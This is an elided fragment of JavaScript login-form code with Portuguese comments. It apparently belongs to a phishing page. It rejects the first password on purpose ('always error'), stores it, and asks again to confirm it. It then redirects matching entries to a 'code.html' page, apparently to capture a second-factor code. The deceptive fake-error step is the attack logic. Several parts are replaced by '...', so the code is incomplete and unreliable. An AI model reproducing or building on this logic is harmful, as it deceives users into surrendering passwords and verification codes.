...
loginForm.addEventListener('submit', e => {
  ...
  if (!primeiraTentativa) {
    // Primeira tentativa: sempre erro, armazenar a senha digitada para comparar depois
    ...
    if (senhaDigitada === primeiraSenha) {
      ...
      // Redirecionar para code.html
      window.location.href = 'code.html';
      return;
    } else {
      // Senha diferente ou incorreta
      loginEmailError.textContent = 'Senha incorreta. Tente novamente.';
      loginEmailError.style.color = 'red';
      loginEmailInput.value = '';
      senhaInput.value = '';
